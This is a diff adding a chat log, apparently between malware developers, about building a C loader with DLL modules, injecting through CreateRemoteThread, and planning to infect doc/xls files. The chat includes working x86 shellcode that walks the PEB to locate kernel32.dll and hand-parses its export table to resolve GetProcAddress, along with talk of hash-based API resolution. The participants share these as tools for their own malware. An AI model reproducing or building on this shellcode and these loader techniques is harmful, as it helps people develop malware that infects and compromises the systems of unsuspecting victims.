@@ -1,0 +1,111 @@
+[17.09.21 10:41:07] gunz: hi, now I have a looder in C with modular loading through dll, I know a little bit of asm, but I have no idea how to implement an exportable function that will work through CreateRemoteThread. can you suggest literature or share experiences, how came to this level?
+[17.09.21 10:45:43] ryan: If this function will be done in asm, you need to do 2 things: 1. prologue and epilogue of the function. The prologue is 3 instructions: push ebp / mov ebp, esp / sub esp, x These three instructions go at the beginning of all procedures written in C. They form the stack frame, a place to store the local variables used in a procedure and a pointer to the parameters that have been passed to the function
+[17.09.21 10:48:28] ryan: After the prologue, the pointer to the local variables and function parameters will be stored in EBP. For example [ebp + 4] - get first function parameter, [ebp - 4] - get first local variable.
+[17.09.21 10:49:49] ryan: 2. The second is to save all registers and flags, because their contents will be spoiled. They are saved by pushad/pushf instruction calls at the beginning and popfd/popad at the end
+[17.09.21 10:52:50] ryan: About prologue and epilogue functions written here https://docs.microsoft.com/ru-ru/cpp/cpp/considerations-for-writing-prolog-epilog-code?view=msvc-160
+[18.09.21 13:03:37] gunz: thanks for the detailed answer, how did you learn asm?
+[19.09.21 08:16:02] ryan: Hi, did you write anything ? Undeciphered message came
+[19.09.21 08:17:46] gunz: Hi, thank you.
+[21.09.21 10:12:19] gunz: hi, you still plan to implement doc/xls infection, right?
+[21.09.21 10:31:53] ryan: hi, yes
+[21.09.21 10:56:45] gunz: keep me posted on your progress/failure, maybe I'll give you some tips from my own experience.
+[21.09.21 11:03:53] ryan: it's not abandoned, I'll post some results there soon
+[16.11.21 11:15:07] gunz: hi, knock
+[16.11.21 11:15:31] ryan: Hi
+[16.11.21 11:19:50] gunz: still not fixed?
+[16.11.21 11:20:14] ryan: Seems to be working, I'll check it now
+[16.11.21 11:21:17] gunz: just wanted to ask you about shellcode moment
+[16.11.21 11:33:38] gunz: when I was writing it, I faced with unpleasant thing - getting function addresses. At the moment I have 2 variations. 1 - getting only LdrLoadDll by hash and loading all dlls via it, then getting function addresses dynamically (GetProcAddressWithHash), but there's much hassle with passing parameters as UNICODE_STRING and string manipulation in general. There is a second way - to call functions by hard-coded hash from libs, but this way is not 100-th, because these values can change. Which way do you use and why?
+[16.11.21 11:34:52] gunz: and can these 2 hashes also fall off in another system when using the first method? `#define LDRLOADDLL_HASH 0xbdbf9c13
+#define LDRGETPROCADDRESS_HASH 0x5ed941b5`
+[16.11.21 11:39:32] ryan: This is how to get the address of kernel32.dll:
+```
+	mov eax,dword [fs:30h]
+	mov eax, [eax + 0Ch]
+	mov eax, [eax + 14h]
+	mov eax, [eax]
+	mov eax, [eax]
+	mov eax, [eax + 10h]
+```
+[16.11.21 11:39:57] ryan: And this is getting the GetProcAddress function. It takes as input the image base kernel32.dll, obtained in the way just shown:
+
+```
+get_gpa:
+	xchg ecx, eax
+
+	push ebx
+	push esi
+
+	test ecx, ecx
+	jz @nothing
+
+	mov eax, [ecx + 3Ch] ; e_lfanew
+	lea eax, [eax + ecx + 78h] ; eax = IMAGE_DATA_DIRECTORY for IMAGE_DIRECTORY_ENTRY_EXPORT
+
+	mov edx, [eax] ; edx = VirtualAddress
+	lea eax, [ecx + edx] ; eax = IMAGE_EXPORT_DIRECTORY
+
+	mov edx, [eax + 18h] ; rdx = NumberOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, NumberOfNames);
+	test edx, edx
+	jz @nothing
+
+	mov ebx, [eax + 20h] ; ebx = AddressOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfNames);
+	lea ebx, [ecx + ebx]
+
+@@1:
+	mov esi, [ebx]
+	lea esi, [ecx + esi] ; function name
+
+	cmp dword [esi], 50746547h ; GetP
+	jnz @@2
+	cmp dword [esi + 4], 41636f72h ; rocA
+	jnz @@2
+	cmp dword [esi + 8], 65726464h ; ddre
+	jnz @@2
+	cmp dword [esi + 11], 00737365h ; ress\0
+	jnz @@2
+
+	neg edx
+	mov esi, [eax + 18h] ; esi = NumberOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, NumberOfNames);
+	lea edx, [esi + edx] ; edx = function index
+
+	mov esi, [eax + 24h] ; r10 = AddressOfNameOrdinals ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfNameOrdinals);
+
+	lea esi, [ecx + esi]
+	movzx edx, word [esi + edx * 2] ; edx = index in the function table
+
+	mov esi, [eax + 1Ch] ; esi = AddressOfFunctions ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfFunctions);
+	lea esi, [ecx + esi]
+
+	mov esi, [esi + edx * 4] ; esi = offset of possible func addr
+
+	mov edx, [eax] ; edx = VirtualAddress ---- size_t offset = offsetof(IMAGE_DATA_DIRECTORY, VirtualAddress);
+	cmp esi, edx
+	jb @nothing
+
+	mov ebx, [eax + 4] ; ebx = Size ---- size_t offset = offsetof(IMAGE_DATA_DIRECTORY, Size);
+	add ebx, edx
+	cmp esi, ebx
+	jae @nothing
+
+	lea eax, [ecx + esi] ; Got our func addr!
+
+	pop esi
+	pop ebx
+	ret
+
+@@2:
+	add ebx, 4
+	dec edx
+	jnz @@1
+
+@nothing:
+	xor eax, eax
+	pop esi
+	pop ebx
+	ret
+```
+[16.11.21 11:40:51] ryan: And after getting GetProcAddress function you already have access to any function from any DLL
+[16.11.21 11:44:53] gunz: is this the standard way LoadLibrary + GetProcAddress?
+[16.11.21 11:45:53] ryan: Yes, many use this way
+[16.11.21 11:54:42] gunz: that's the problem
